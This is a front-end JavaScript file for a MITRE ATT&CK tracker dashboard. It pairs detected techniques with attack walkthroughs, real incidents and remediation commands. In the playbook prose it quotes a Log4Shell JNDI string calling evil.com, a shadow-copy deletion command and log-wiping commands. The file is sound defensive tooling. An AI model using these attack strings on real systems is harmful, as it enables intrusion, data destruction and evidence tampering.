/**
 * frontend/assets/js/mitre-tracker.js
 * MITRE ATT&CK Tracker — Kill Chain Pipeline, Step-by-Step Attack Walkthroughs,
 * Real-World Scenarios, and Actionable Remediation Playbooks
 */

const KILL_CHAIN_STAGES = [
  { id: 'TA0001', name: 'Initial Access', short: 'Access' },
  { id: 'TA0002', name: 'Execution', short: 'Exec' },
  { id: 'TA0003', name: 'Persistence', short: 'Persist' },
  { id: 'TA0004', name: 'Privilege Escalation', short: 'PrivEsc' },
  { id: 'TA0005', name: 'Defense Evasion', short: 'Evasion' },
  { id: 'TA0006', name: 'Credential Access', short: 'Creds' },
  { id: 'TA0007', name: 'Discovery', short: 'Discovery' },
  { id: 'TA0008', name: 'Lateral Movement', short: 'Lateral' },
  { id: 'TA0009', name: 'Collection', short: 'Collection' },
  { id: 'TA0010', name: 'Exfiltration', short: 'Exfil' },
  { id: 'TA0040', name: 'Impact', short: 'Impact' }
];

const DEFENSE_PLAYBOOKS = {
  'T1190': {
    title: 'Exploit Public-Facing Application',
    step1: 'Attacker scans your public IP/web server (Port 80/443), identifies unpatched parameters, and sends crafted input (SQLi / JNDI / SSRF payloads).',
    step2: 'The backend web framework fails input sanitization, executing the command in the application process context without authentication.',
    step3: 'Attacker extracts database credentials, establishes a reverse web shell, and compromises web tier host files.',
    scenario_title: 'Log4Shell (CVE-2021-44228) & Equifax Struts RCE',
    scenario_desc: 'Attackers inject strings like ${jndi:ldap://evil.com/a} into HTTP User-Agent headers, triggering remote class execution on web servers.',
    action: 'Place WAF in active blocking mode, deploy input parameter sanitization with prepared statements, and quarantine public-facing web PID.',
    command: 'sudo iptables -I INPUT -p tcp --dport 443 -m string --algo bm --string "UNION SELECT" -j DROP\nnginx -s reload'
  },
  'T1078': {
    title: 'Valid Accounts Abuse',
    step1: 'Attacker obtains valid username and password hashes via credential dumps, phishing, or default vendor configurations.',
    step2: 'The adversary authenticates through standard SSH, RDP, or cloud console portals outside business hours, bypassing traditional firewalls.',
    step3: 'Using the legitimate privileges of the account, the attacker accesses confidential database schemas and creates secondary backdoor accounts.',
    scenario_title: 'Colonial Pipeline VPN Breach (DarkSide)',
    scenario_desc: 'Compromised single-factor legacy VPN password used to log in legitimately, leading to enterprise-wide infrastructure shutdown.',
    action: 'Immediately terminate all active sessions for the user, force password rotation, revoke cloud API access tokens, and mandate hardware MFA.',
    command: 'aws iam revoke-security-tokens --user-name compromised-admin\nGet-ADUser -Identity "compromised_user" | Disable-ADAccount'
  },
  'T1566': {
    title: 'Phishing Weapon Delivery',
    step1: 'Victim receives an urgent email masquerading as an executive invoice or corporate HR notice containing a malicious ZIP or macro attachment.',
    step2: 'Victim double-clicks and opens the attachment; a background VBScript/macro triggers an automated hidden PowerShell execution.',
    step3: 'The script downloads a Cobalt Strike stager or keylogger, stealing cached browser cookies and network passwords.',
    scenario_title: 'Emotet / TrickBot Infection Wave',
    scenario_desc: 'Password-protected ZIP files with weaponized macro spreadsheets bypassing perimeter email scanners and dropping secondary ransomware payloads.',
    action: 'Isolate affected workstation from corporate LAN, purge email message ID across all Exchange mailboxes, and block sender domain.',
    command: 'Disable-NetAdapter -Name "Ethernet*" -Confirm:$false\nSearch-Mailbox -Identity "All" -SearchQuery \'Subject:"Urgent Invoice"\' -DeleteContent -Force'
  },
  'T1133': {
    title: 'External Remote Services Exposure',
    step1: 'Attacker identifies exposed remote management interfaces (RDP port 3389, SSH port 22, or corporate VPN gateways) exposed directly to the internet.',
    step2: 'The adversary executes high-speed credential stuffing or exploits unpatched SSL VPN vulnerabilities (e.g. Fortinet/Pulse Secure CVEs).',
    step3: 'Once authenticated, the attacker tunnels into the internal network DMZ, moving laterally toward corporate active directory servers.',
    scenario_title: 'Pulse Secure / Citrix Gateway VPN Exploits',
    scenario_desc: 'Zero-day path traversal vulnerabilities exploited to read VPN session databases and hijack active remote administrator connections.',
    action: 'Block offending source IP at edge perimeter firewall, disable direct RDP exposure to internet, enforce VPN MFA, and enable Geo-IP filtering.',
    command: 'sudo ufw deny from 185.220.101.5 to any proto tcp\nfail2ban-client set sshd banip 185.220.101.5'
  },
  'T1059': {
    title: 'Command and Scripting Interpreter Execution',
    step1: 'Attacker drops an obfuscated script (PowerShell, Bash, or Python) on the system via initial access foothold or secondary stager.',
    step2: 'Attacker executes PowerShell with -ExecutionPolicy Bypass -NoProfile -EncodedCommand, running code directly in RAM memory without writing to disk.',
    step3: 'The in-memory script injects shellcode into svchost.exe or explorer.exe, bypassing antivirus scanning and granting full remote command control.',
    scenario_title: 'SolarWinds SUNBURST & Cobalt Strike Beaconing',
    scenario_desc: 'Trojanized software updates launching encoded background PowerShell processes that query system architecture and communicate with external C2.',
    action: 'Enforce PowerShell ConstrainedLanguageMode, enable script block logging (Event ID 4104), and terminate originating PID.',
    command: 'Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope LocalMachine -Force\nStop-Process -Id 4812 -Force'
  },
  'T1110': {
    title: 'Brute Force & Credential Spraying',
    step1: 'Attacker uses automated tools (Hydra, Medusa, or custom Python scripts) to cycle through thousands of common passwords against SSH/HTTP login routes.',
    step2: 'The server receives dozens of authentication requests per second, flooding auth.log with "Failed password for invalid user" entries.',
    step3: 'The attacker finds a single weak password (e.g. "Summer2026!"), logs in with user privileges, and proceeds to local system privilege escalation.',
    scenario_title: 'Mass SSH Scanner Botnets (Mirai & FritzFrog)',
    scenario_desc: 'Distributed botnets sending millions of SSH password combinations against Linux cloud servers with weak root credentials.',
    action: 'Enforce account lockouts after 5 consecutive failures, ban offending IP subnet dynamically via fail2ban, and disable password-based SSH authentication.',
    command: 'sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set\nsudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP'
  },
  'T1486': {
    title: 'Data Encrypted for Impact (Ransomware)',
    step1: 'Attacker deploys ransomware executable onto domain controller or shared storage after establishing admin privileges across the subnet.',
    step2: 'The ransomware process terminates database engines and deletes Volume Shadow Copies (vssadmin delete shadows /all /quiet) to prevent recovery.',
    step3: 'It systematically encrypts every document, database, and system file with AES-256 / RSA-4096, changing file extensions and displaying ransom demands.',
    scenario_title: 'LockBit 3.0 & WannaCry Ransomware Outbreaks',
    scenario_desc: 'Automated multithreaded file encryption terminating hypervisor VMs, encrypting virtual disks (.vmdk), and demanding cryptocurrency ransoms.',
    action: 'IMMEDIATELY disconnect network cables and disable all network adapters (do NOT reboot). Capture RAM dump and restore systems from offline immutable backups.',
    command: 'Disable-NetAdapter -Name "Ethernet*" -Confirm:$false\nGet-Service -Name "VolumeShadowCopy" | Start-Service'
  },
  'T1048': {
    title: 'Exfiltration Over Alternative Protocol',
    step1: 'Attacker compresses sensitive files (customer databases, credentials, source code) into password-protected archives (e.g., 7z or tar.gz).',
    step2: 'The attacker initiates outbound data transfers using non-standard protocols (DNS tunneling, ICMP payloads, or encrypted HTTPS POST to external IPs).',
    step3: 'Confidential proprietary data leaves the network perimeter undetected by standard email and web filters, leading to data extortion.',
    scenario_title: 'Lapsus$ & Conti Corporate Data Extortion',
    scenario_desc: 'Exfiltrating source code and cryptographic certificates to cloud file sharing services (Mega, Dropbox) prior to deploying encryption.',
    action: 'Blackhole outbound destination IP address on edge routers, reset perimeter egress NAT, and inspect egress proxy logs for anomalous data spikes.',
    command: 'sudo route add -host 198.51.100.45 reject\nsudo iptables -A OUTPUT -d 198.51.100.45 -j REJECT'
  },
  'T1070': {
    title: 'Indicator Removal on Host (Log Tampering)',
    step1: 'Attacker gains local administrative or root permissions on the compromised server.',
    step2: 'The attacker runs commands like "wevtutil cl Security" or "rm -rf /var/log/*" to wipe audit trails and security event logs.',
    step3: 'Forensic investigators lose visibility into what files were accessed, what malware was downloaded, and how the breach originated.',
    scenario_title: 'APT29 / Nobelium Forensic Countermeasures',
    scenario_desc: 'Clearing Windows Event Log IDs 1102 (audit log cleared) and altering file timestamps ($MFT timestomping) to hide malicious activity.',
    action: 'Forward syslog/Windows Event Logs in real-time to an immutable, write-only SIEM, lock local log permissions, and alert on Event ID 1102.',
    command: 'sudo chattr +a /var/log/auth.log\nwevtutil sl Security /e:true /rt:false'
  },
  'T1068': {
    title: 'Exploitation for Privilege Escalation',
    step1: 'Attacker accesses the system as an unprivileged local user (e.g. www-data or guest).',
    step2: 'The attacker executes a local privilege escalation exploit targeting known kernel bugs (e.g. Dirty COW, PwnKit) or misconfigured SUID binaries.',
    step3: 'The kernel grants root/SYSTEM UID 0 privileges, allowing the attacker to bypass all user permissions and install kernel rootkits.',
    scenario_title: 'PwnKit (CVE-2021-4034) & Dirty Pipe (CVE-2022-0847)',
    scenario_desc: 'Unprivileged local users exploiting polkit pkexec binary to instantly gain interactive root shells on default Linux distributions.',
    action: 'Deploy operating system and kernel security patches immediately, strip SUID bits from unnecessary binaries, and enforce SELinux in Enforcing mode.',
    command: 'sudo setenforce 1\nchmod -s /usr/local/bin/legacy_wrapper'
  }
};

const DEFAULT_PLAYBOOK = {
  title: 'Forensic Signature Match',
  step1: 'Attacker probes system endpoint for open communication channels and configuration oversights.',
  step2: 'Adversary executes unauthorized telemetry commands matching heuristic threat signatures.',
  step3: 'Target host experiences anomalous behavior, requiring forensic containment.',
  scenario_title: 'Standard ATT&CK Vector Exploitation',
  scenario_desc: 'Adversary tactics attempting to move across perimeter boundaries or manipulate system processes.',
  action: 'Isolate affected host from production LAN, capture volatile memory snapshot, and rotate all administrative session credentials.',
  command: 'sudo ip link set dev eth0 down\nsudo dd if=/dev/mem of=/mnt/forensic/mem.raw bs=1M status=progress'
};

let currentMatches = [];
let allTactics = [];

// Initialize tracker page
async function initTracker() {
  await loadTactics();
  renderKillChain();
  await runMapping();
}

async function loadTactics() {
  try {
    const res = await Api.mitreTactics();
    allTactics = (res && res.tactics) ? res.tactics : [];
    renderTacticsMatrix([]);
  } catch (e) {
    console.error('Failed to load tactics:', e);
  }
}

function renderKillChain(matchedTactics = new Set()) {
  const container = document.getElementById('killChainPipeline');
  if (!container) return;

  container.innerHTML = KILL_CHAIN_STAGES.map((s, idx) => {
    const isHit = matchedTactics.has(s.id);
    return `
      <div class="killchain-step ${isHit ? 'hit' : ''}" title="${s.name}">
        <div class="killchain-step-num">${idx + 1}</div>
        <div class="killchain-step-name">${s.short}</div>
        <div class="killchain-step-badge ${isHit ? 'badge badge-danger' : 'badge badge-neutral'}">
          ${isHit ? 'DETECTED' : 'CLEAR'}
        </div>
      </div>
    `;
  }).join('');
}

function renderTacticsMatrix(matchedList) {
  const container = document.getElementById('tacticsMatrix');
  if (!container) return;

  const countByTactic = {};
  matchedList.forEach(m => {
    countByTactic[m.tactic] = (countByTactic[m.tactic] || 0) + 1;
  });

  container.innerHTML = allTactics.map(t => {
    const cnt = countByTactic[t.id] || 0;
    const hasHits = cnt > 0;
    return `
      <div class="tactic-box ${hasHits ? 'has-hits' : ''}" onclick="filterByTactic('${t.id}')">
        <div class="tactic-box-top">
          <span class="tactic-box-title">${t.name}</span>
          <span class="tactic-box-count">${cnt}</span>
        </div>
        <div style="font-size:11px;color:var(--ink-2);font-family:var(--font-mono);">${t.id}</div>
      </div>
    `;
  }).join('');
}

async function runMapping() {
  const container = document.getElementById('dossierList');
  container.innerHTML = '<div style="padding:40px;text-align:center;color:var(--ink-2);"><div class="spinner spinner-lg mb-3"></div>Correlating latest telemetry against ATT&CK taxonomy…</div>';

  try {
    const res = await Api.mitreUserLatest();
    if (res.ok && res.data && res.data.matches && res.data.matches.length > 0) {
      applyMappingResult(res.data);
    } else {
      await loadDemoDataset('web_exploit');
    }
  } catch (err) {
    console.warn('Fallback to demo mapping:', err);
    await loadDemoDataset('web_exploit');
  }
}

async function loadDemoDataset(type) {
  const container = document.getElementById('dossierList');
  container.innerHTML = `<div style="padding:40px;text-align:center;color:var(--ink-2);"><div class="spinner spinner-lg mb-3"></div>Loading attack scenario: <strong>${type}</strong>…</div>`;

  try {
    const sampleRes = await Api.sampleLogs(type);
    if (!sampleRes.ok || !sampleRes.data || !sampleRes.data.logs) {
      container.innerHTML = '<div style="padding:32px;text-align:center;color:var(--ink-3);">Failed to load sample dataset.</div>';
      return;
    }
    const mapRes = await Api.mitreMap(sampleRes.data.logs);
    if (mapRes.ok && mapRes.data) {
      toast(`Loaded scenario '${type}' with ${mapRes.data.total_matches} detected ATT&CK techniques`, 'info');
      applyMappingResult(mapRes.data);
    }
  } catch (err) {
    container.innerHTML = `<div style="padding:32px;text-align:center;color:#EF4444;">Error mapping scenario: ${err.message}</div>`;
  }
}

function applyMappingResult(data) {
  currentMatches = data.matches || [];

  document.getElementById('kpiMatched').textContent = currentMatches.length;
  const topTactic = (data.tactic_summary || [])[0];
  document.getElementById('kpiTactic').textContent = topTactic ? topTactic.name : 'Safe';
  
  let worstSev = 'LOW';
  currentMatches.forEach(m => {
    if (m.severity === 'CRITICAL') worstSev = 'CRITICAL';
    else if (m.severity === 'HIGH' && worstSev !== 'CRITICAL') worstSev = 'HIGH';
    else if (m.severity === 'MEDIUM' && worstSev !== 'CRITICAL' && worstSev !== 'HIGH') worstSev = 'MEDIUM';
  });
  const sevEl = document.getElementById('kpiSev');
  sevEl.textContent = currentMatches.length ? worstSev : 'SAFE';
  sevEl.style.color = worstSev === 'CRITICAL' ? '#EF4444' : (worstSev === 'HIGH' ? '#F97316' : '#10B981');
  
  document.getElementById('kpiCorrelated').textContent = data.total_matches || currentMatches.length;

  const hitTactics = new Set(currentMatches.map(m => m.tactic));
  renderKillChain(hitTactics);
  renderTacticsMatrix(currentMatches);
  renderDossierCards(currentMatches);
}

function renderDossierCards(matches) {
  const container = document.getElementById('dossierList');
  if (!matches.length) {
    container.innerHTML = `
      <div class="card" style="padding:40px;text-align:center;">
        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#10B981" stroke-width="2" style="margin:0 auto 12px;"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
        <h4 style="color:var(--ink-0);margin-bottom:6px;">Clean Forensic Baseline</h4>
        <p style="color:var(--ink-2);font-size:var(--text-sm);margin:0;">No MITRE ATT&CK techniques matched in the active log telemetry.</p>
      </div>`;
    return;
  }

  container.innerHTML = matches.map((m, idx) => {
    const pb = DEFENSE_PLAYBOOKS[m.technique] || {
      title: m.name,
      step1: `Adversary probes system looking for vulnerabilities related to ${m.name}.`,
      step2: `Malicious command is executed via internal or external interaction.`,
      step3: `Target host experiences unauthorized access or credential exposure.`,
      scenario_title: 'Enterprise Attack Correlation',
      scenario_desc: 'Observed attack patterns matching forensic signatures.',
      action: m.remediation || DEFAULT_PLAYBOOK.action,
      command: DEFAULT_PLAYBOOK.command
    };

    const scriptId = `script-cmd-${idx}`;
    return `
      <div class="dossier-card sev-${m.severity}">
        <div class="dossier-top">
          <div class="dossier-title-group">
            <span class="dossier-tid">${m.technique}</span>
            <span class="dossier-tname">${pb.title}</span>
            <span class="dossier-tactic-badge">${m.tactic_name || m.tactic}</span>
            ${sevBadge(m.severity)}
          </div>
          <button class="btn btn-outline btn-sm" onclick="openTechniqueModal('${m.technique}')">
            <span>Inspect Full Attack Spec</span>
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
          </button>
        </div>

        <div class="dossier-body">
          <div class="dossier-intel-box">
            <div class="dossier-intel-title">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
              Step-by-Step Attack Walkthrough
            </div>
            
            <div class="attack-steps-flow">
              <div class="attack-step-item">
                <span class="attack-step-num">Step 1: Infiltration</span>
                <span>${pb.step1}</span>
              </div>
              <div class="attack-step-item">
                <span class="attack-step-num">Step 2: Execution</span>
                <span>${pb.step2}</span>
              </div>
              <div class="attack-step-item">
                <span class="attack-step-num">Step 3: Compromise</span>
                <span>${pb.step3}</span>
              </div>
            </div>

            <div class="attack-scenarios-box">
              <div class="attack-scenario-title">
                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polygon points="12 8 8 12 12 16 16 12 12 8"/></svg>
                Real-World Attack Case: ${pb.scenario_title}
              </div>
              <div class="attack-scenario-text">${pb.scenario_desc}</div>
            </div>

            <div style="margin-top:12px;">
              <span style="font-size:11px;font-weight:600;color:var(--ink-3);text-transform:uppercase;">Matched Signatures:</span>
              <div class="hit-patterns-wrap" style="margin-top:4px;">
                ${(m.patterns_hit || []).map(p => `<span class="hit-pattern-tag">${p}</span>`).join('')}
              </div>
            </div>
          </div>

          <div class="dossier-playbook-box">
            <div class="dossier-playbook-title">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#047857" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
              Possible Solution & Actionable Remediation
            </div>
            <div class="dossier-playbook-text">
              ${pb.action}
            </div>
            <div class="dossier-script-wrap">
              <span class="dossier-script-code" id="${scriptId}">${pb.command}</span>
              <button class="btn-copy-script" onclick="copySnippet('${scriptId}')">Copy Rule</button>
            </div>
          </div>
        </div>

        <div class="dossier-foot">
          <div style="font-size:11px;color:var(--ink-3);">
            Evidence reference: <span style="font-family:var(--font-mono);">${m.log_msg || 'Stream pattern correlation'}</span>
          </div>
          <a href="${m.mitre_url || `https://attack.mitre.org/techniques/${m.technique}/`}" target="_blank" rel="noopener noreferrer" style="font-size:12px;color:var(--brand-primary);font-weight:600;text-decoration:none;">
            Official MITRE Matrix &rarr;
          </a>
        </div>
      </div>
    `;
  }).join('');
}

function filterByTactic(tacticId) {
  const filtered = currentMatches.filter(m => m.tactic === tacticId);
  if (!filtered.length) {
    toast(`No detected threats currently mapped to ${tacticId}`, 'info');
    return;
  }
  renderDossierCards(filtered);
  toast(`Filtered ${filtered.length} technique(s) in ${tacticId}`, 'info');
}

function filterDossiers() {
  const q = (document.getElementById('trackerSearch')?.value || '').toLowerCase();
  const sev = document.getElementById('trackerFilterSev')?.value || '';

  const filtered = currentMatches.filter(m => {
    const matchQ = !q || m.name.toLowerCase().includes(q) || m.technique.toLowerCase().includes(q) || (m.tactic_name || '').toLowerCase().includes(q);
    const matchSev = !sev || m.severity === sev;
    return matchQ && matchSev;
  });

  renderDossierCards(filtered);
}

// Modal inspection reusing mitre-catalog details
async function openTechniqueModal(tid) {
  const modal = document.getElementById('techModal');
  if (!modal) return;

  const pb = DEFENSE_PLAYBOOKS[tid];

  try {
    const res = await Api.mitreTechnique(tid);
    if (!res.ok || !res.data || !res.data.technique) {
      toast('Failed to load technique details', 'error');
      return;
    }
    const t = res.data.technique;
    document.getElementById('modalId').textContent = t.id;
    document.getElementById('modalName').textContent = pb ? pb.title : t.name;
    document.getElementById('modalTactic').textContent = t.tactic_info ? t.tactic_info.name : t.tactic;

    const sevEl = document.getElementById('modalSev');
    sevEl.textContent = t.severity;
    sevEl.className = `badge badge-${t.severity === 'CRITICAL' ? 'danger' : (t.severity === 'HIGH' ? 'warning' : 'info')}`;

    const descEl = document.getElementById('modalDesc');
    if (pb) {
      descEl.innerHTML = `
        <div style="margin-bottom:8px;">${t.description}</div>
        <div class="attack-steps-flow">
          <div class="attack-step-item">
            <span class="attack-step-num">Step 1</span>
            <span><strong>Infiltration:</strong> ${pb.step1}</span>
          </div>
          <div class="attack-step-item">
            <span class="attack-step-num">Step 2</span>
            <span><strong>Execution:</strong> ${pb.step2}</span>
          </div>
          <div class="attack-step-item">
            <span class="attack-step-num">Step 3</span>
            <span><strong>Compromise:</strong> ${pb.step3}</span>
          </div>
        </div>
      `;
    } else {
      descEl.textContent = t.description;
    }

    const exEl = document.getElementById('modalExamples');
    if (pb && pb.scenario_desc) {
      exEl.innerHTML = `
        <div class="example-box">
          <strong>${pb.scenario_title}:</strong> ${pb.scenario_desc}
        </div>
        ${(t.examples && t.examples.length) ? t.examples.map(ex => `<div class="example-box">${ex}</div>`).join('') : ''}
      `;
    } else {
      exEl.innerHTML = (t.examples && t.examples.length)
        ? t.examples.map(ex => `<div class="example-box">${ex}</div>`).join('')
        : '<div style="color:var(--ink-3);font-size:12px;">No specific attack scenarios cataloged.</div>';
    }

    const patEl = document.getElementById('modalPatterns');
    patEl.innerHTML = (t.log_patterns && t.log_patterns.length)
      ? t.log_patterns.map(p => `<span class="pattern-badge">${p}</span>`).join('')
      : '<div style="color:var(--ink-3);font-size:12px;">No automated signatures assigned.</div>';

    const linkEl = document.getElementById('modalLink');
    linkEl.href = t.mitre_url || `https://attack.mitre.org/techniques/${t.id}/`;

    modal.classList.add('show');
  } catch (err) {
    toast(`Error: ${err.message}`, 'error');
  }
}

function closeModal() {
  document.getElementById('techModal')?.classList.remove('show');
}

function copySnippet(elemId) {
  const text = document.getElementById(elemId)?.textContent;
  if (!text) return;
  navigator.clipboard.writeText(text).then(() => {
    toast('Defense command copied to clipboard', 'success');
  }).catch(() => {
    toast('Failed to copy command', 'error');
  });
}
